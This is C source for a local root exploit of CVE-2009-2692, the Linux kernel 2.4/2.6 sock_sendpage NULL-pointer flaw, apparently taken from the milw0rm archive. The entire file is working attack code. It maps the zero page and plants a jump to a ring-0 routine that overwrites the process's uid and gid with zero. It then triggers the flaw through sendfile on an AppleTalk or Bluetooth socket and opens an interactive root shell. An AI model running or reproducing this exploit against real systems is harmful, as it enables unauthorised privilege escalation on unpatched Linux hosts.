/*
**
** 0x82-CVE-2009-2692
** Linux kernel 2.4/2.6 (32bit) sock_sendpage() local ring0 root exploit (simple ver)
** Tested RedHat Linux 9.0, Fedora core 4~11, Whitebox 4, CentOS 4.x.
**
** --
** Discovered by Tavis Ormandy and Julien Tinnes of the Google Security Team.
** spender and venglin's code is very excellent.
** Thankful to them.
**
** Greets: Brad Spengler <spender(at)grsecurity(dot)net>,
**         Przemyslaw Frasunek <venglin(at)czuby(dot)pl>.
** --
** exploit by <p0c73n1(at)gmail(dot)com>.
**
** "Slow and dirty exploit for this one"
**
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/personality.h>

unsigned int uid, gid;

void kernel_code()
{
	unsigned long where=0;
	unsigned long *pcb_task_struct;

	where=(unsigned long )&where;
	where&=~8191;
	pcb_task_struct=(unsigned long *)where;

	while(pcb_task_struct){
		if(pcb_task_struct[0]==uid&&pcb_task_struct[1]==uid&&
			pcb_task_struct[2]==uid&&pcb_task_struct[3]==uid&&
			pcb_task_struct[4]==gid&&pcb_task_struct[5]==gid&&
			pcb_task_struct[6]==gid&&pcb_task_struct[7]==gid){
			pcb_task_struct[0]=pcb_task_struct[1]=pcb_task_struct[2]=pcb_task_struct[3]=0;
			pcb_task_struct[4]=pcb_task_struct[5]=pcb_task_struct[6]=pcb_task_struct[7]=0;
			break;
		}
		pcb_task_struct++;
	}
	return;
	/*
	** By calling iret after pushing a register into kernel stack,
	** We don't have to go back to ring3(user mode) privilege level. dont worry. :-}
	**
	** kernel_code() function will return to its previous status which means before sendfile() system call,
	** after operating upon a ring0(kernel mode) privilege level.
	** This will enhance the viablity of the attack code even though each kernel can have different CS and DS address.
	*/
}
void *kernel=kernel_code;

int main(int argc,char *argv[])
{
	int fd_in=0,fd_out=0,offset=1;
	void *zero_page;

	uid=getuid();
	gid=getgid();
	if(uid==0){
		fprintf(stderr,"[-] check ur uid\n");
		return -1;
	}

	/*
	** There are some cases that we need mprotect due to the dependency matter with SVR4. (however, I did not confirm it yet)
	*/
	if(personality(0xffffffff)==PER_SVR4){
		if(mprotect(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)==-1){
			perror("[-] mprotect()");
			return -1;
		}
	}
	else if((zero_page=mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0))==MAP_FAILED){
			perror("[-] mmap()");
			return -1;
	}
	*(char *)0x00000000=0xff;
	*(char *)0x00000001=0x25;
	*(unsigned long *)0x00000002=(unsigned long)&kernel;
	*(char *)0x00000006=0xc3;

	if((fd_in=open(argv[0],O_RDONLY))==-1){
		perror("[-] open()");
		return -1;
	}
	if((fd_out=socket(PF_APPLETALK,SOCK_DGRAM,0))==-1){
		if((fd_out=socket(PF_BLUETOOTH,SOCK_DGRAM,0))==-1){
			perror("[-] socket()");
			return -1;
		}
	}
gogossing:
	/*
	** Sometimes, the attacks can fail. To enlarge the possiblilty of attack,
	** an attacker can make all the processes runing under current user uid 0.
	*/
	if(sendfile(fd_out,fd_in,&offset,2)==-1){
		if(offset==0){
			perror("[-] sendfile()");
			return -1;
		}
		close(fd_out);
		fd_out=socket(PF_BLUETOOTH,SOCK_DGRAM,0);
	}
	if(getuid()==uid){
		if(offset){
			offset=0;
		}
		goto gogossing; /* all process */
	}
	close(fd_in);
	close(fd_out);

	execl("/bin/sh","sh","-i",NULL);
	return 0;
}

/* eoc */

// milw0rm.com [2009-08-24]